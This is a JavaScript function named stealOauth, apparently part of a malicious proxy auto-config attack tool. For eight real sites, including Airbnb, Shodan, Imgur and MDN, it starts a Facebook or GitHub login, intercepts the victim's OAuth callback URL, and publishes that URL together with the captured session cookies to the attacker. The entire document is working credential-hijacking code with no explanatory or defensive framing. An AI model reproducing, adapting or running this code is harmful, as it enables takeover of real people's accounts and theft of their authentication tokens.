function stealOauth(pac) {
    pac.scrapeUrl("https://www.engadget.com/auth/engadget_auth/social/facebook/login?display=popup", function(pac, data) {
        if (data.code == 302) {
            var cookies = data.cookies;
            url = data.headers.location;
            pac.addBlockRequestHandler(url, /^https?:\/\/www.engadget.com\/auth\/engadget_auth\/social\//, function(pac, url) {
                pac.publishMsg("oauth", { name: "engadget.com", url: url, cookies: cookies, domain: "engadget.com" });
            });
        }
    });

    pac.scrapeUrl("https://imgur.com/signin/facebook?redirect=http%3A%2F%2Fimgur.com%2F", function(pac, data) {
        if (data.code == 302) {
            var cookies = data.cookies;
            url = data.headers.location;
            pac.addBlockRequestHandler(url, /^https?:\/\/imgur.com\/signin\/facebook/, function(pac, url) {
                pac.publishMsg("oauth", { name: "imgur.com", url: url, cookies: cookies, domain: "imgur.com" });
            });
        }
    });

    pac.scrapeUrl("http://www.4shared.com/oauth/startFacebookLogin.jsp?redir=http%3A%2F%2Fwww.4shared.com%2Faccount%2Fhome.jsp", { regex: /https:\/\/www.facebook.com[^']+/ }, function(pac, data) {
        console.log(data)
        if (data.code == 200) {
            var cookies = data.cookies;
            url = data.data;
            pac.addBlockRequestHandler(url, /^https?:\/\/www.4shared.com\/servlet\/facebook\//, function(pac, url) {
                pac.publishMsg("oauth", { name: "4shared.com", url: url, cookies: cookies, domain: "4shared.com" });
            });
        }
    });

    url = "https://www.facebook.com/dialog/oauth?redirect_uri=http%3A%2F%2Fwww.livejournal.com%2Fidentity%2Fcallback-facebook.bml%3Fforwhat%3Dwww%2524%252F&app_id=189818072392&scope=publish_actions,email,user_about_me,user_birthday,user_hometown,user_interests,user_website,user_posts,user_photos,user_videos&display=page";
    pac.addBlockRequestHandler(url, /^https?:\/\/www.livejournal.com\/identity\/callback-facebook.bml/, function(pac, url) {
        pac.publishMsg("oauth", { name: "livejournal.com", url: url, cookies: {}, domain: "livejournal.com" });
    });

    pac.scrapeUrl("https://account.shodan.io/login/facebook", function(pac, data) {
        if (data.code == 302) {
            var cookies = data.cookies;
            url = data.headers.location;
            pac.addBlockRequestHandler(url, /^https?:\/\/account.shodan.io\/login\/facebook\/callback/, function(pac, url) {
                pac.publishMsg("oauth", { name: "shodan.io", url: url, cookies: cookies, domain: "shodan.io" });
            });
        }
    });

    pac.scrapeUrl("https://developer.mozilla.org/en-US/users/github/login/?next=%2Fen-US%2F", function(pac, data) {
        if (data.code == 302) {
            var cookies = data.cookies;
            url = data.headers.location;
            pac.addBlockRequestHandler(url, /^https?:\/\/developer.mozilla.org\/users\/github\/login\/callback\//, function(pac, url) {
                pac.publishMsg("oauth", { name: "developer.mozilla.org", url: url, cookies: cookies, domain: "developer.mozilla.org" });
            });
        }
    });

    pac.scrapeUrl("https://codepen.io/", function(pac, data) {
        if (data.code == 200) {
            var cookies = data.cookies;
            url = data.headers.location;
            pac.scrapeUrl("https://codepen.io/login/github", { cookies: cookies }, function(pac, data) {
                if (data.code == 302) {
                  var cookies = data.cookies;
                  url = data.headers.location;
                  pac.addBlockRequestHandler(url, /^https?:\/\/codepen.io\/login\/auth_callback/, function(pac, url) {
                      pac.publishMsg("oauth", { name: "codepen.io", url: url, cookies: cookies, domain: "None" });
                  });
                }
            });
        }
    });

    pac.scrapeUrl("https://www.airbnb.com/login_modal", function(pac, data) {
        if (data.code == 302) {
            var cookies = data.cookies;
            pac.scrapeUrl("https://www.airbnb.com/oauth_connect?from=facebook_login&service=facebook", { cookies: cookies }, function(pac, data) {
                if (data.code == 302) {
                    url = data.headers.location;
                    pac.addBlockRequestHandler(url, /^https:\/\/www.airbnb.com\/oauth_callback/, function(pac, url) {
                        pac.publishMsg("oauth", { name: "airbnb.com", url: url, cookies: cookies, domain: "airbnb.com" });
                    });
                }
            });
        }
    });
}
